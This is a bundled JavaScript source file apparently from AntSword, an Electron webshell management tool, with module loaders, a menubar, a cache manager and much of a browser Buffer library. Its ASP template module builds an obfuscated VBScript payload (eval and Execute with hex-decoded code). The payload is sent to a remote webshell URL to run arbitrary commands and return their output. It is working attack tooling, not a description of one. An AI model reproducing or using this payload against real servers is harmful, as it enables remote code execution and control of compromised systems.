/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};

/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {

/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId])
/******/ 			return installedModules[moduleId].exports;

/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			exports: {},
/******/ 			id: moduleId,
/******/ 			loaded: false
/******/ 		};

/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);

/******/ 		// Flag the module as loaded
/******/ 		module.loaded = true;

/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}


/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;

/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;

/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";

/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(global) {//
	// 程序入口
	// -------
	// create: 2015/12/20
	// update: 2016/01/20
	//

	'use strict';

	var _menubar = __webpack_require__(1);

	var _menubar2 = _interopRequireDefault(_menubar);

	var _cachemanager = __webpack_require__(2);

	var _cachemanager2 = _interopRequireDefault(_cachemanager);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	var electron = global.require('electron');
	var remote = electron.remote;
	var ipcRenderer = electron.ipcRenderer;

	var antSword = window.antSword = {
	  noxss: function noxss(html) {
	    return String(html).replace(/&/g, "&amp;").replace(/>/g, "&gt;").replace(/</g, "&lt;").replace(/"/g, "&quot;");
	  }
	};

	// 加载模板代码
	antSword['core'] = {};
	['php', 'asp', 'aspx', 'custom'].map(function (_) {
	  antSword['core'][_] = __webpack_require__(3)("./" + _ + '/index');
	});

	// 加载显示语言
	var _lang = localStorage.getItem('language') || navigator.language;
	_lang = ['en', 'zh', 'jp'].indexOf(_lang) === -1 ? 'en' : _lang;
	antSword['language'] = __webpack_require__(69)("./" + _lang);

	antSword['ipcRenderer'] = ipcRenderer;
	antSword['CacheManager'] = _cachemanager2.default;
	antSword['menubar'] = new _menubar2.default();

	// 加载模块列表
	antSword['tabbar'] = new dhtmlXTabBar(document.getElementById('container'));
	['shellmanager', 'settings', 'plugin'].map(function (_) {
	  var _module = __webpack_require__(73)("./" + _ + '/index');
	  new _module.default();
	});
	// 移除加载界面&&设置标题
	$('#loading').remove();
	document.title = antSword['language']['title'] || 'AntSword';
	/* WEBPACK VAR INJECTION */}.call(exports, (function() { return this; }())))

/***/ },
/* 1 */
/***/ function(module, exports) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 前端菜单交互模块
	//

	var Menubar = function () {
	  function Menubar() {
	    var _this = this;

	    _classCallCheck(this, Menubar);

	    this.events = {};
	    // 加载菜单栏
	    antSword['ipcRenderer'].send('menubar', antSword['language']['menubar']);
	    // 菜单栏事件
	    /*
	      如何注册菜单栏点击事件？
	      antSword['menubar'].reg('command', () => {});
	    */
	    antSword['ipcRenderer'].on('menubar', function (event, argv) {
	      var cmd = '';
	      var arg = '';
	      if (argv instanceof Array && argv.length === 2) {
	        cmd = argv[0];
	        arg = argv[1];
	      } else {
	        cmd = argv;
	      }
	      switch (cmd) {
	        case 'tabbar-next':
	          antSword['tabbar'].goToNextTab();
	          break;
	        case 'tabbar-prev':
	          antSword['tabbar'].goToPrevTab();
	          break;
	        case 'tabbar-close':
	          var tab = antSword['tabbar'].getActiveTab();
	          if (tab === 'tab_shellmanager') {
	            return;
	          };
	          antSword['tabbar'].tabs(tab).close();
	          break;
	        default:
	          // 检测是否有注册事件？执行注册事件：忽略
	          var caller = _this.events[cmd];
	          if (caller instanceof Function) {
	            caller();
	          };
	      }
	    });
	  }

	  _createClass(Menubar, [{
	    key: 'reg',
	    value: function reg(name, event) {
	      this['events'][name] = event;
	    }
	  }, {
	    key: 'run',
	    value: function run(name) {
	      this['events'][name]();
	    }
	  }]);

	  return Menubar;
	}();

	exports.default = Menubar;

/***/ },
/* 2 */
/***/ function(module, exports) {

	//
	// 缓存操作模块
	//
	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var CacheManager = function () {
	  function CacheManager(id) {
	    _classCallCheck(this, CacheManager);

	    this.id = id;
	    this.sender = antSword['ipcRenderer'].sendSync;
	  }

	  // 获取缓存


	  _createClass(CacheManager, [{
	    key: 'get',
	    value: function get(tag) {
	      var ret = this.sender('cache-get', {
	        id: this.id,
	        tag: tag
	      });
	      return ret ? ret['cache'] : false;
	    }

	    // 更新缓存

	  }, {
	    key: 'set',
	    value: function set(tag, cache) {
	      return this.sender('cache-add', {
	        id: this.id,
	        tag: tag,
	        cache: cache
	      });
	    }

	    // 删除缓存

	  }, {
	    key: 'del',
	    value: function del(tag) {
	      return this.sender('cache-del', {
	        id: this.id,
	        tag: tag
	      });
	    }

	    // 清空缓存

	  }, {
	    key: 'clear',
	    value: function clear() {
	      return this.sender('cache-clear', {
	        id: this.id
	      });
	    }
	  }]);

	  return CacheManager;
	}();

	exports.default = CacheManager;

/***/ },
/* 3 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./asp/index": 4,
		"./aspx/index": 26,
		"./custom/index": 44,
		"./php/index": 56
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 3;


/***/ },
/* 4 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(global, Buffer) {'use strict';

	var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 代码模板::asp
	//

	var iconv = global.require('iconv-lite');

	var ASP = function () {
	  function ASP(opts) {
	    _classCallCheck(this, ASP);

	    this.__opts__ = opts;
	    this.parseTpl(['base', 'command', 'filemanager', 'database/dsn', 'database/mysql', 'database/access', 'database/oracle', 'database/sqlserver', 'database/sqloledb_1', 'database/sqloledb_1_sspi', 'database/microsoft_jet_oledb_4_0']);
	    this.parseEnr([]);
	  }

	  // 格式化函数


	  _createClass(ASP, [{
	    key: 'format',
	    value: function format() {
	      var encode = this.__opts__['encode'] || 'utf8';
	      return {
	        base64: function base64(str) {
	          // 编码
	          var _str_ = iconv.encode(new Buffer(str), encode);
	          return new Buffer(_str_).toString('base64');
	        },
	        // 转换为16进制::编码
	        hex: function hex(b) {
	          var ret = [];
	          var buff = iconv.encode(new Buffer(b), encode);

	          buff.toJSON()['data'].map(function (i) {
	            var _ = i.toString(16);
	            _.length < 2 ? _ = '0' + _ : null;
	            ret.push(_);
	          });

	          return ret.join('').toUpperCase();
	        },
	        // 转换为16进制::不编码
	        buffer: function buffer(b) {
	          var ret = [];

	          b.toJSON()['data'].map(function (i) {
	            var _ = i.toString(16);
	            _.length < 2 ? _ = '0' + _ : null;
	            ret.push(_);
	          });

	          return ret.join('').toUpperCase();
	        }
	      };
	    }

	    // 解析模板

	  }, {
	    key: 'parseTpl',
	    value: function parseTpl(tpl) {
	      var _this = this;

	      var _export = {};

	      // 模板格式化函数
	      var format = this.format();

	      // 加载模板代码
	      tpl.map(function (t) {
	        // 解析模板
	        _this[t.replace(/\//g, '_')] = {};
	        var m = __webpack_require__(9)("./" + t);
	        for (var _ in m) {
	          _this[t.replace(/\//g, '_')][_] = function (c) {
	            // 如果需要参数
	            if ((typeof c === 'undefined' ? 'undefined' : _typeof(c)) === 'object') {
	              return function (argv, success, error, hook) {
	                var data = $.extend({}, c);
	                // 格式化参数

	                var _loop = function _loop(d) {
	                  (data[d].match(/#{([\w\:]+)}/g) || []).map(function (tag) {
	                    var _t = tag.substr(2, tag.length - 3);
	                    // 如果需要字符处理
	                    var _f = _t.split('::');
	                    var _ff = void 0;
	                    if (_f.length > 0 && (_ff = format[_f[0]])) {
	                      // _t = _ff(argv[_f[1]] || _t);
	                      _t = _ff(argv[_f[1]] || '');
	                    } else {
	                      // _t = argv[_t] || _t;
	                      _t = argv[_t] || '';
	                    }
	                    data[d] = data[d].replace(tag, _t);
	                  });
	                };

	                for (var d in data) {
	                  _loop(d);
	                }
	                _this.ajax(data, success, error, hook);
	              };
	            } else {
	              var _ret2 = function () {
	                var data = {
	                  _: c
	                };
	                return {
	                  v: function v(success, error, hook) {
	                    _this.ajax(data, success, error, hook);
	                  }
	                };
	              }();

	              if ((typeof _ret2 === 'undefined' ? 'undefined' : _typeof(_ret2)) === "object") return _ret2.v;
	            }
	          }(m[_]);
	        }
	      });
	    }

	    // 解析编码模块

	  }, {
	    key: 'parseEnr',
	    value: function parseEnr(edr) {
	      var encoder = {
	        // 默认编码器
	        default: function _default(pwd, data) {
	          data[pwd] = data['_'];
	          delete data['_'];
	          return data;
	        }
	      };
	      edr.map(function (_) {
	        encoder[_] = __webpack_require__(23)("./" + _);
	      });
	      this.__encoder__ = encoder;
	    }
	  }, {
	    key: 'ajax',
	    value: function ajax(code, success, error, hook) {
	      var post = $.extend({}, code);
	      // 随机ID(用于监听数据来源)
	      var hash = (String(+new Date()) + String(Math.random())).substr(10, 10).replace('.', '_');
	      var tag_s = '-=:{';
	      var tag_e = '}:=-';
	      var encode = this.__opts__['encode'] || 'utf8';

	      var code_hex = this.format()['hex'](post['_']);

	      post['_'] = 'eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""' + tag_s + '""""):Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""' + code_hex + '"""")):Response.Write(""""' + tag_e + '""""):Response.End"")")';

	      // 编码处理模板
	      var encoder = this.__encoder__[this.__opts__['encoder'] || 'default'] || this.__encoder__['default'];
	      var data = encoder(this.__opts__['pwd'], post);

	      // 监听数据返回
	      antSword['ipcRenderer']
	      // 请求完毕返回数据{text,buff}
	      .on('request-' + hash, function (event, arg) {
	        success(arg['text'], arg['buff']);
	      })
	      // HTTP请求返回字节流
	      .on('request-chunk-' + hash, function (event, ret) {
	        hook ? hook(ret) : null;
	      })
	      // 数据请求错误
	      .on('request-error-' + hash, function (event, ret) {
	        error ? error(ret) : null;
	      })
	      // 发送请求数据
	      .send('request', {
	        url: this.__opts__['url'],
	        hash: hash,
	        data: data,
	        tag_s: tag_s,
	        tag_e: tag_e,
	        encode: encode
	      });
	    }
	  }]);

	  return ASP;
	}();

	module.exports = ASP;
	/* WEBPACK VAR INJECTION */}.call(exports, (function() { return this; }()), __webpack_require__(5).Buffer))

/***/ },
/* 5 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer, global) {/*!
	 * The buffer module from node.js, for the browser.
	 *
	 * @author   Feross Aboukhadijeh <feross@feross.org> <http://feross.org>
	 * @license  MIT
	 */
	/* eslint-disable no-proto */

	'use strict'

	var base64 = __webpack_require__(6)
	var ieee754 = __webpack_require__(7)
	var isArray = __webpack_require__(8)

	exports.Buffer = Buffer
	exports.SlowBuffer = SlowBuffer
	exports.INSPECT_MAX_BYTES = 50
	Buffer.poolSize = 8192 // not used by this implementation

	var rootParent = {}

	/**
	 * If `Buffer.TYPED_ARRAY_SUPPORT`:
	 *   === true    Use Uint8Array implementation (fastest)
	 *   === false   Use Object implementation (most compatible, even IE6)
	 *
	 * Browsers that support typed arrays are IE 10+, Firefox 4+, Chrome 7+, Safari 5.1+,
	 * Opera 11.6+, iOS 4.2+.
	 *
	 * Due to various browser bugs, sometimes the Object implementation will be used even
	 * when the browser supports typed arrays.
	 *
	 * Note:
	 *
	 *   - Firefox 4-29 lacks support for adding new properties to `Uint8Array` instances,
	 *     See: https://bugzilla.mozilla.org/show_bug.cgi?id=695438.
	 *
	 *   - Safari 5-7 lacks support for changing the `Object.prototype.constructor` property
	 *     on objects.
	 *
	 *   - Chrome 9-10 is missing the `TypedArray.prototype.subarray` function.
	 *
	 *   - IE10 has a broken `TypedArray.prototype.subarray` function which returns arrays of
	 *     incorrect length in some situations.

	 * We detect these buggy browsers and set `Buffer.TYPED_ARRAY_SUPPORT` to `false` so they
	 * get the Object implementation, which is slower but behaves correctly.
	 */
	Buffer.TYPED_ARRAY_SUPPORT = global.TYPED_ARRAY_SUPPORT !== undefined
	  ? global.TYPED_ARRAY_SUPPORT
	  : typedArraySupport()

	function typedArraySupport () {
	  function Bar () {}
	  try {
	    var arr = new Uint8Array(1)
	    arr.foo = function () { return 42 }
	    arr.constructor = Bar
	    return arr.foo() === 42 && // typed array instances can be augmented
	        arr.constructor === Bar && // constructor can be set
	        typeof arr.subarray === 'function' && // chrome 9-10 lack `subarray`
	        arr.subarray(1, 1).byteLength === 0 // ie10 has broken `subarray`
	  } catch (e) {
	    return false
	  }
	}

	function kMaxLength () {
	  return Buffer.TYPED_ARRAY_SUPPORT
	    ? 0x7fffffff
	    : 0x3fffffff
	}

	/**
	 * Class: Buffer
	 * =============
	 *
	 * The Buffer constructor returns instances of `Uint8Array` that are augmented
	 * with function properties for all the node `Buffer` API functions. We use
	 * `Uint8Array` so that square bracket notation works as expected -- it returns
	 * a single octet.
	 *
	 * By augmenting the instances, we can avoid modifying the `Uint8Array`
	 * prototype.
	 */
	function Buffer (arg) {
	  if (!(this instanceof Buffer)) {
	    // Avoid going through an ArgumentsAdaptorTrampoline in the common case.
	    if (arguments.length > 1) return new Buffer(arg, arguments[1])
	    return new Buffer(arg)
	  }

	  if (!Buffer.TYPED_ARRAY_SUPPORT) {
	    this.length = 0
	    this.parent = undefined
	  }

	  // Common case.
	  if (typeof arg === 'number') {
	    return fromNumber(this, arg)
	  }

	  // Slightly less common case.
	  if (typeof arg === 'string') {
	    return fromString(this, arg, arguments.length > 1 ? arguments[1] : 'utf8')
	  }

	  // Unusual.
	  return fromObject(this, arg)
	}

	function fromNumber (that, length) {
	  that = allocate(that, length < 0 ? 0 : checked(length) | 0)
	  if (!Buffer.TYPED_ARRAY_SUPPORT) {
	    for (var i = 0; i < length; i++) {
	      that[i] = 0
	    }
	  }
	  return that
	}

	function fromString (that, string, encoding) {
	  if (typeof encoding !== 'string' || encoding === '') encoding = 'utf8'

	  // Assumption: byteLength() return value is always < kMaxLength.
	  var length = byteLength(string, encoding) | 0
	  that = allocate(that, length)

	  that.write(string, encoding)
	  return that
	}

	function fromObject (that, object) {
	  if (Buffer.isBuffer(object)) return fromBuffer(that, object)

	  if (isArray(object)) return fromArray(that, object)

	  if (object == null) {
	    throw new TypeError('must start with number, buffer, array or string')
	  }

	  if (typeof ArrayBuffer !== 'undefined') {
	    if (object.buffer instanceof ArrayBuffer) {
	      return fromTypedArray(that, object)
	    }
	    if (object instanceof ArrayBuffer) {
	      return fromArrayBuffer(that, object)
	    }
	  }

	  if (object.length) return fromArrayLike(that, object)

	  return fromJsonObject(that, object)
	}

	function fromBuffer (that, buffer) {
	  var length = checked(buffer.length) | 0
	  that = allocate(that, length)
	  buffer.copy(that, 0, 0, length)
	  return that
	}

	function fromArray (that, array) {
	  var length = checked(array.length) | 0
	  that = allocate(that, length)
	  for (var i = 0; i < length; i += 1) {
	    that[i] = array[i] & 255
	  }
	  return that
	}

	// Duplicate of fromArray() to keep fromArray() monomorphic.
	function fromTypedArray (that, array) {
	  var length = checked(array.length) | 0
	  that = allocate(that, length)
	  // Truncating the elements is probably not what people expect from typed
	  // arrays with BYTES_PER_ELEMENT > 1 but it's compatible with the behavior
	  // of the old Buffer constructor.
	  for (var i = 0; i < length; i += 1) {
	    that[i] = array[i] & 255
	  }
	  return that
	}

	function fromArrayBuffer (that, array) {
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    // Return an augmented `Uint8Array` instance, for best performance
	    array.byteLength
	    that = Buffer._augment(new Uint8Array(array))
	  } else {
	    // Fallback: Return an object instance of the Buffer class
	    that = fromTypedArray(that, new Uint8Array(array))
	  }
	  return that
	}

	function fromArrayLike (that, array) {
	  var length = checked(array.length) | 0
	  that = allocate(that, length)
	  for (var i = 0; i < length; i += 1) {
	    that[i] = array[i] & 255
	  }
	  return that
	}

	// Deserialize { type: 'Buffer', data: [1,2,3,...] } into a Buffer object.
	// Returns a zero-length buffer for inputs that don't conform to the spec.
	function fromJsonObject (that, object) {
	  var array
	  var length = 0

	  if (object.type === 'Buffer' && isArray(object.data)) {
	    array = object.data
	    length = checked(array.length) | 0
	  }
	  that = allocate(that, length)

	  for (var i = 0; i < length; i += 1) {
	    that[i] = array[i] & 255
	  }
	  return that
	}

	if (Buffer.TYPED_ARRAY_SUPPORT) {
	  Buffer.prototype.__proto__ = Uint8Array.prototype
	  Buffer.__proto__ = Uint8Array
	} else {
	  // pre-set for values that may exist in the future
	  Buffer.prototype.length = undefined
	  Buffer.prototype.parent = undefined
	}

	function allocate (that, length) {
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    // Return an augmented `Uint8Array` instance, for best performance
	    that = Buffer._augment(new Uint8Array(length))
	    that.__proto__ = Buffer.prototype
	  } else {
	    // Fallback: Return an object instance of the Buffer class
	    that.length = length
	    that._isBuffer = true
	  }

	  var fromPool = length !== 0 && length <= Buffer.poolSize >>> 1
	  if (fromPool) that.parent = rootParent

	  return that
	}

	function checked (length) {
	  // Note: cannot use `length < kMaxLength` here because that fails when
	  // length is NaN (which is otherwise coerced to zero.)
	  if (length >= kMaxLength()) {
	    throw new RangeError('Attempt to allocate Buffer larger than maximum ' +
	                         'size: 0x' + kMaxLength().toString(16) + ' bytes')
	  }
	  return length | 0
	}

	function SlowBuffer (subject, encoding) {
	  if (!(this instanceof SlowBuffer)) return new SlowBuffer(subject, encoding)

	  var buf = new Buffer(subject, encoding)
	  delete buf.parent
	  return buf
	}

	Buffer.isBuffer = function isBuffer (b) {
	  return !!(b != null && b._isBuffer)
	}

	Buffer.compare = function compare (a, b) {
	  if (!Buffer.isBuffer(a) || !Buffer.isBuffer(b)) {
	    throw new TypeError('Arguments must be Buffers')
	  }

	  if (a === b) return 0

	  var x = a.length
	  var y = b.length

	  var i = 0
	  var len = Math.min(x, y)
	  while (i < len) {
	    if (a[i] !== b[i]) break

	    ++i
	  }

	  if (i !== len) {
	    x = a[i]
	    y = b[i]
	  }

	  if (x < y) return -1
	  if (y < x) return 1
	  return 0
	}

	Buffer.isEncoding = function isEncoding (encoding) {
	  switch (String(encoding).toLowerCase()) {
	    case 'hex':
	    case 'utf8':
	    case 'utf-8':
	    case 'ascii':
	    case 'binary':
	    case 'base64':
	    case 'raw':
	    case 'ucs2':
	    case 'ucs-2':
	    case 'utf16le':
	    case 'utf-16le':
	      return true
	    default:
	      return false
	  }
	}

	Buffer.concat = function concat (list, length) {
	  if (!isArray(list)) throw new TypeError('list argument must be an Array of Buffers.')

	  if (list.length === 0) {
	    return new Buffer(0)
	  }

	  var i
	  if (length === undefined) {
	    length = 0
	    for (i = 0; i < list.length; i++) {
	      length += list[i].length
	    }
	  }

	  var buf = new Buffer(length)
	  var pos = 0
	  for (i = 0; i < list.length; i++) {
	    var item = list[i]
	    item.copy(buf, pos)
	    pos += item.length
	  }
	  return buf
	}

	function byteLength (string, encoding) {
	  if (typeof string !== 'string') string = '' + string

	  var len = string.length
	  if (len === 0) return 0

	  // Use a for loop to avoid recursion
	  var loweredCase = false
	  for (;;) {
	    switch (encoding) {
	      case 'ascii':
	      case 'binary':
	      // Deprecated
	      case 'raw':
	      case 'raws':
	        return len
	      case 'utf8':
	      case 'utf-8':
	        return utf8ToBytes(string).length
	      case 'ucs2':
	      case 'ucs-2':
	      case 'utf16le':
	      case 'utf-16le':
	        return len * 2
	      case 'hex':
	        return len >>> 1
	      case 'base64':
	        return base64ToBytes(string).length
	      default:
	        if (loweredCase) return utf8ToBytes(string).length // assume utf8
	        encoding = ('' + encoding).toLowerCase()
	        loweredCase = true
	    }
	  }
	}
	Buffer.byteLength = byteLength

	function slowToString (encoding, start, end) {
	  var loweredCase = false

	  start = start | 0
	  end = end === undefined || end === Infinity ? this.length : end | 0

	  if (!encoding) encoding = 'utf8'
	  if (start < 0) start = 0
	  if (end > this.length) end = this.length
	  if (end <= start) return ''

	  while (true) {
	    switch (encoding) {
	      case 'hex':
	        return hexSlice(this, start, end)

	      case 'utf8':
	      case 'utf-8':
	        return utf8Slice(this, start, end)

	      case 'ascii':
	        return asciiSlice(this, start, end)

	      case 'binary':
	        return binarySlice(this, start, end)

	      case 'base64':
	        return base64Slice(this, start, end)

	      case 'ucs2':
	      case 'ucs-2':
	      case 'utf16le':
	      case 'utf-16le':
	        return utf16leSlice(this, start, end)

	      default:
	        if (loweredCase) throw new TypeError('Unknown encoding: ' + encoding)
	        encoding = (encoding + '').toLowerCase()
	        loweredCase = true
	    }
	  }
	}

	Buffer.prototype.toString = function toString () {
	  var length = this.length | 0
	  if (length === 0) return ''
	  if (arguments.length === 0) return utf8Slice(this, 0, length)
	  return slowToString.apply(this, arguments)
	}

	Buffer.prototype.equals = function equals (b) {
	  if (!Buffer.isBuffer(b)) throw new TypeError('Argument must be a Buffer')
	  if (this === b) return true
	  return Buffer.compare(this, b) === 0
	}

	Buffer.prototype.inspect = function inspect () {
	  var str = ''
	  var max = exports.INSPECT_MAX_BYTES
	  if (this.length > 0) {
	    str = this.toString('hex', 0, max).match(/.{2}/g).join(' ')
	    if (this.length > max) str += ' ... '
	  }
	  return '<Buffer ' + str + '>'
	}

	Buffer.prototype.compare = function compare (b) {
	  if (!Buffer.isBuffer(b)) throw new TypeError('Argument must be a Buffer')
	  if (this === b) return 0
	  return Buffer.compare(this, b)
	}

	Buffer.prototype.indexOf = function indexOf (val, byteOffset) {
	  if (byteOffset > 0x7fffffff) byteOffset = 0x7fffffff
	  else if (byteOffset < -0x80000000) byteOffset = -0x80000000
	  byteOffset >>= 0

	  if (this.length === 0) return -1
	  if (byteOffset >= this.length) return -1

	  // Negative offsets start from the end of the buffer
	  if (byteOffset < 0) byteOffset = Math.max(this.length + byteOffset, 0)

	  if (typeof val === 'string') {
	    if (val.length === 0) return -1 // special case: looking for empty string always fails
	    return String.prototype.indexOf.call(this, val, byteOffset)
	  }
	  if (Buffer.isBuffer(val)) {
	    return arrayIndexOf(this, val, byteOffset)
	  }
	  if (typeof val === 'number') {
	    if (Buffer.TYPED_ARRAY_SUPPORT && Uint8Array.prototype.indexOf === 'function') {
	      return Uint8Array.prototype.indexOf.call(this, val, byteOffset)
	    }
	    return arrayIndexOf(this, [ val ], byteOffset)
	  }

	  function arrayIndexOf (arr, val, byteOffset) {
	    var foundIndex = -1
	    for (var i = 0; byteOffset + i < arr.length; i++) {
	      if (arr[byteOffset + i] === val[foundIndex === -1 ? 0 : i - foundIndex]) {
	        if (foundIndex === -1) foundIndex = i
	        if (i - foundIndex + 1 === val.length) return byteOffset + foundIndex
	      } else {
	        foundIndex = -1
	      }
	    }
	    return -1
	  }

	  throw new TypeError('val must be string, number or Buffer')
	}

	// `get` is deprecated
	Buffer.prototype.get = function get (offset) {
	  console.log('.get() is deprecated. Access using array indexes instead.')
	  return this.readUInt8(offset)
	}

	// `set` is deprecated
	Buffer.prototype.set = function set (v, offset) {
	  console.log('.set() is deprecated. Access using array indexes instead.')
	  return this.writeUInt8(v, offset)
	}

	function hexWrite (buf, string, offset, length) {
	  offset = Number(offset) || 0
	  var remaining = buf.length - offset
	  if (!length) {
	    length = remaining
	  } else {
	    length = Number(length)
	    if (length > remaining) {
	      length = remaining
	    }
	  }

	  // must be an even number of digits
	  var strLen = string.length
	  if (strLen % 2 !== 0) throw new Error('Invalid hex string')

	  if (length > strLen / 2) {
	    length = strLen / 2
	  }
	  for (var i = 0; i < length; i++) {
	    var parsed = parseInt(string.substr(i * 2, 2), 16)
	    if (isNaN(parsed)) throw new Error('Invalid hex string')
	    buf[offset + i] = parsed
	  }
	  return i
	}

	function utf8Write (buf, string, offset, length) {
	  return blitBuffer(utf8ToBytes(string, buf.length - offset), buf, offset, length)
	}

	function asciiWrite (buf, string, offset, length) {
	  return blitBuffer(asciiToBytes(string), buf, offset, length)
	}

	function binaryWrite (buf, string, offset, length) {
	  return asciiWrite(buf, string, offset, length)
	}

	function base64Write (buf, string, offset, length) {
	  return blitBuffer(base64ToBytes(string), buf, offset, length)
	}

	function ucs2Write (buf, string, offset, length) {
	  return blitBuffer(utf16leToBytes(string, buf.length - offset), buf, offset, length)
	}

	Buffer.prototype.write = function write (string, offset, length, encoding) {
	  // Buffer#write(string)
	  if (offset === undefined) {
	    encoding = 'utf8'
	    length = this.length
	    offset = 0
	  // Buffer#write(string, encoding)
	  } else if (length === undefined && typeof offset === 'string') {
	    encoding = offset
	    length = this.length
	    offset = 0
	  // Buffer#write(string, offset[, length][, encoding])
	  } else if (isFinite(offset)) {
	    offset = offset | 0
	    if (isFinite(length)) {
	      length = length | 0
	      if (encoding === undefined) encoding = 'utf8'
	    } else {
	      encoding = length
	      length = undefined
	    }
	  // legacy write(string, encoding, offset, length) - remove in v0.13
	  } else {
	    var swap = encoding
	    encoding = offset
	    offset = length | 0
	    length = swap
	  }

	  var remaining = this.length - offset
	  if (length === undefined || length > remaining) length = remaining

	  if ((string.length > 0 && (length < 0 || offset < 0)) || offset > this.length) {
	    throw new RangeError('attempt to write outside buffer bounds')
	  }

	  if (!encoding) encoding = 'utf8'

	  var loweredCase = false
	  for (;;) {
	    switch (encoding) {
	      case 'hex':
	        return hexWrite(this, string, offset, length)

	      case 'utf8':
	      case 'utf-8':
	        return utf8Write(this, string, offset, length)

	      case 'ascii':
	        return asciiWrite(this, string, offset, length)

	      case 'binary':
	        return binaryWrite(this, string, offset, length)

	      case 'base64':
	        // Warning: maxLength not taken into account in base64Write
	        return base64Write(this, string, offset, length)

	      case 'ucs2':
	      case 'ucs-2':
	      case 'utf16le':
	      case 'utf-16le':
	        return ucs2Write(this, string, offset, length)

	      default:
	        if (loweredCase) throw new TypeError('Unknown encoding: ' + encoding)
	        encoding = ('' + encoding).toLowerCase()
	        loweredCase = true
	    }
	  }
	}

	Buffer.prototype.toJSON = function toJSON () {
	  return {
	    type: 'Buffer',
	    data: Array.prototype.slice.call(this._arr || this, 0)
	  }
	}

	function base64Slice (buf, start, end) {
	  if (start === 0 && end === buf.length) {
	    return base64.fromByteArray(buf)
	  } else {
	    return base64.fromByteArray(buf.slice(start, end))
	  }
	}

	function utf8Slice (buf, start, end) {
	  end = Math.min(buf.length, end)
	  var res = []

	  var i = start
	  while (i < end) {
	    var firstByte = buf[i]
	    var codePoint = null
	    var bytesPerSequence = (firstByte > 0xEF) ? 4
	      : (firstByte > 0xDF) ? 3
	      : (firstByte > 0xBF) ? 2
	      : 1

	    if (i + bytesPerSequence <= end) {
	      var secondByte, thirdByte, fourthByte, tempCodePoint

	      switch (bytesPerSequence) {
	        case 1:
	          if (firstByte < 0x80) {
	            codePoint = firstByte
	          }
	          break
	        case 2:
	          secondByte = buf[i + 1]
	          if ((secondByte & 0xC0) === 0x80) {
	            tempCodePoint = (firstByte & 0x1F) << 0x6 | (secondByte & 0x3F)
	            if (tempCodePoint > 0x7F) {
	              codePoint = tempCodePoint
	            }
	          }
	          break
	        case 3:
	          secondByte = buf[i + 1]
	          thirdByte = buf[i + 2]
	          if ((secondByte & 0xC0) === 0x80 && (thirdByte & 0xC0) === 0x80) {
	            tempCodePoint = (firstByte & 0xF) << 0xC | (secondByte & 0x3F) << 0x6 | (thirdByte & 0x3F)
	            if (tempCodePoint > 0x7FF && (tempCodePoint < 0xD800 || tempCodePoint > 0xDFFF)) {
